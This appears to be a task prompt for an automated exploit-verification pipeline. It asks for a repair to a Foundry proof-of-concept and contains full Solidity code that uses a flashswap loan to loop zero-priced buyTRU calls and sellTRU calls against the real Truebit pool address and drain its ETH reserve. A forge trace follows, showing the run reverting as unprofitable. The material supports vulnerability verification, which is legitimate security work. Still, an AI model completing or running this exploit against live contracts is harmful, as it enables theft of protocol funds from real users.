You are fixing a failing Foundry PoC for finding TRUEBIT-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Bonding-curve purchase quote can round down to zero, enabling free buys and reserve drain
- claim: The documented `getPurchasePrice` implementation computes the buy quote as `(THETA - 100) * totalSupply^2 / (200 * totalSupply * amount * reserve + 100 * amount^2 * reserve)`. Because the denominator increases with `amount`, a sufficiently large purchase causes the integer-divided quote to floor to `0`. The exploit loop in `testExploit()` shows that the attacker can then call `buyTRU(amount)` with that zero-valued quote and immediately `sellTRU(amount)` for ETH, repeating until the pool is empty. The comments also record live parameters (`THETA = 0x98`, `reserve = 0x9a`) that make the zero-price region reachable permissionlessly.
- impact: An attacker can acquire TRU for free or near-free and redeem it back to the pool for real ETH, draining the pool reserve and causing catastrophic loss of protocol funds.
- exploit_paths: ["Truebit.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface ITruebitPool {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buyTRU(uint256 amount) external payable;
    function sellTRU(uint256 amount) external payable;
    function reserve() external view returns (uint256);
    function THETA() external view returns (uint256);
}

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant POOL = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant ATTACK_AMOUNT = 240442509453545333947284131;
    uint256 internal constant MIN_POOL_BALANCE = 0.1 ether;
    uint256 internal constant MAX_ROUNDS = 48;

    uint256 internal _profitAmount;
    bool internal _executed;
    address internal _activePair;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        uint256 startingEth = address(this).balance;
        uint256 startingWeth = IWETH(WETH).balanceOf(address(this));

        IERC20Minimal(TRU).approve(POOL, type(uint256).max);

        (uint256 amount, uint256 quote) = _selectExploitAmount(type(uint256).max);
        require(amount != 0, "no exploitable amount");

        address pair = _findFlashswapPair();

        // Core exploit path remains the same as the finding: acquire underpriced TRU
        // from the bonding curve and immediately redeem the same TRU back to the pool
        // for reserve ETH. A public V2 flashswap is only used as realistic temporary
        // working capital when this fork requires a non-zero upfront buy quote.
        if (pair != address(0)) {
            uint256 borrowAmount = quote == 0 ? 1 : quote;
            _activePair = pair;

            address token0 = IUniswapV2Pair(pair).token0();
            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();

            if (token0 == WETH) {
                require(borrowAmount < reserve0, "insufficient WETH reserve0");
                IUniswapV2Pair(pair).swap(borrowAmount, 0, address(this), abi.encode(amount));
            } else {
                require(borrowAmount < reserve1, "insufficient WETH reserve1");
                IUniswapV2Pair(pair).swap(0, borrowAmount, address(this), abi.encode(amount));
            }

            _activePair = address(0);
        } else {
            _runExploitLoop(amount);
        }

        uint256 gainedEth = address(this).balance - startingEth;
        if (gainedEth != 0) {
            IWETH(WETH).deposit{value: gainedEth}();
        }

        _profitAmount = IWETH(WETH).balanceOf(address(this)) - startingWeth;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == _activePair, "unauthorized pair");
        require(sender == address(this), "unauthorized sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        uint256 preferredAmount = abi.decode(data, (uint256));

        IWETH(WETH).withdraw(borrowedWeth);
        _runExploitLoop(preferredAmount);

        uint256 repayAmount = _flashswapRepayment(borrowedWeth);
        require(address(this).balance >= repayAmount, "flashswap not repaid");

        IWETH(WETH).deposit{value: repayAmount}();
        require(IWETH(WETH).transfer(msg.sender, repayAmount), "repay transfer failed");
    }

    function _runExploitLoop(uint256 preferredAmount) internal {
        uint256 round;
        uint256 nextPreferred = preferredAmount;

        while (round < MAX_ROUNDS && address(POOL).balance >= MIN_POOL_BALANCE) {
            (uint256 amount, uint256 quote) = _selectExploitAmount(address(this).balance);
            if (amount == 0) {
                if (nextPreferred == 0) {
                    break;
                }
                amount = nextPreferred;
                quote = _safeQuote(amount);
                if (quote == type(uint256).max || quote > address(this).balance) {
                    break;
                }
            }

            uint256 ethBefore = address(this).balance;
            uint256 truBefore = IERC20Minimal(TRU).balanceOf(address(this));

            ITruebitPool(POOL).buyTRU{value: quote}(amount);

            uint256 bought = IERC20Minimal(TRU).balanceOf(address(this)) - truBefore;
            require(bought != 0, "buy produced no TRU");

            ITruebitPool(POOL).sellTRU(bought);

            uint256 ethAfter = address(this).balance;
            require(ethAfter > ethBefore, "round not profitable");

            nextPreferred = amount;
            unchecked {
                ++round;
            }
        }
    }

    function _selectExploitAmount(uint256 ethBudget) internal view returns (uint256 bestAmount, uint256 bestQuote) {
        uint256 totalSupply = IERC20Minimal(TRU).totalSupply();
        uint256 theta = ITruebitPool(POOL).THETA();
        uint256 reserve = ITruebitPool(POOL).reserve();

        uint256[11] memory candidates;
        candidates[0] = ATTACK_AMOUNT;
        candidates[1] = totalSupply;
        candidates[2] = totalSupply + (totalSupply / 2);
        candidates[3] = totalSupply + (totalSupply / 4);
        candidates[4] = totalSupply * 2;
        candidates[5] = totalSupply * 3;
        candidates[6] = _solveThetaGreaterThanHundred(totalSupply, reserve, theta);
        candidates[7] = _solveThetaLessThanHundred(totalSupply, reserve, theta);
        candidates[8] = ATTACK_AMOUNT + (totalSupply / 16);
        candidates[9] = ATTACK_AMOUNT > totalSupply / 16 ? ATTACK_AMOUNT - (totalSupply / 16) : 0;
        candidates[10] = ATTACK_AMOUNT + 1;

        bestQuote = type(uint256).max;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = candidates[i];
            if (candidate == 0) {
                continue;
            }

            uint256 quote = _safeQuote(candidate);
            if (quote == type(uint256).max || quote > ethBudget) {
                continue;
            }

            if (
                bestAmount == 0 ||
                quote < bestQuote ||
                (quote == bestQuote && candidate > bestAmount)
            ) {
                bestAmount = candidate;
                bestQuote = quote;

                if (quote == 0) {
                    break;
                }
            }
        }
    }

    function _safeQuote(uint256 amount) internal view returns (uint256 quote) {
        try ITruebitPool(POOL).getPurchasePrice(amount) returns (uint256 q) {
            return q;
        } catch {
            return type(uint256).max;
        }
    }

    function _findFlashswapPair() internal view returns (address pair) {
        pair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(TRU, WETH);
        if (pair != address(0)) {
            return pair;
        }

        pair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(TRU, WETH);
    }

    function _flashswapRepayment(uint256 borrowedWeth) internal pure returns (uint256) {
        return ((borrowedWeth * 1000) / 997) + 1;
    }

    function _solveThetaGreaterThanHundred(
        uint256 totalSupply,
        uint256 reserve,
        uint256 theta
    ) internal pure returns (uint256) {
        if (reserve == 0 || totalSupply == 0 || theta <= 100) {
            return 0;
        }

        uint256 numerator = (theta - 100) * totalSupply * totalSupply;
        uint256 rootTarget = totalSupply * totalSupply + (numerator / (100 * reserve)) + 1;
        uint256 root = _sqrt(rootTarget);
        if (root * root < rootTarget) {
            unchecked {
                ++root;
            }
        }

        if (root <= totalSupply) {
            return 0;
        }

        return root - totalSupply;
    }

    function _solveThetaLessThanHundred(
        uint256 totalSupply,
        uint256 reserve,
        uint256 theta
    ) internal pure returns (uint256) {
        if (reserve == 0 || totalSupply == 0 || theta >= 100) {
            return 0;
        }

        uint256 numerator = (100 - theta) * totalSupply * totalSupply;
        uint256 rootTarget = totalSupply * totalSupply + (numerator / (100 * reserve));
        uint256 root = _sqrt(rootTarget);
        if (root <= totalSupply) {
            return 1;
        }

        return root - totalSupply;
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y == 0) {
            return 0;
        }
        if (y <= 3) {
            return 1;
        }

        z = y;
        uint256 x = y / 2 + 1;
        while (x < z) {
            z = x;
            x = (y / x + x) / 2;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function targetPool() external pure returns (address) {
        return POOL;
    }

    function targetToken() external pure returns (address) {
        return TRU;
    }
}

```

forge stdout (tail):
```
00000016ff) [delegatecall]
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000016ff
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [1313] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [542] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 5887
    │   │   │   │   └─ ← [Return] 5887
    │   │   │   ├─ [21906] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::sellTRU(5887)
    │   │   │   │   ├─ [21135] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::sellTRU(5887) [delegatecall]
    │   │   │   │   │   ├─ [1483] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::dd62ed3e(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2) [staticcall]
    │   │   │   │   │   │   ├─ [709] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::dd62ed3e(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffff391c5171d3454ed675455c
    │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffff391c5171d3454ed675455c
    │   │   │   │   │   ├─ [1172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   │   │   │   │   ├─ [404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 161753242367424992669189090 [1.617e26]
    │   │   │   │   │   │   └─ ← [Return] 161753242367424992669189090 [1.617e26]
    │   │   │   │   │   ├─ [10116] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 5887)
    │   │   │   │   │   │   ├─ [9336] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 5887) [delegatecall]
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000016ff
    │   │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2
    │   │   │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffff391c5171d3454ed6752e5d
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [4329] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::42966c68(00000000000000000000000000000000000000000000000000000000000016ff)
    │   │   │   │   │   │   ├─ [3561] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::42966c68(00000000000000000000000000000000000000000000000000000000000016ff) [delegatecall]
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2
    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000016ff
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   ├─ [67] FlawVerifier::receive()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Revert] round not profitable
    │   │   └─ ← [Revert] round not profitable
    │   └─ ← [Revert] round not profitable
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x80b4d4e9d88D9f78198c56c5A27F3BACB9A685C5.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.75s (1.71s CPU time)

Ran 1 test suite in 1.75s (1.75s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 410217)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
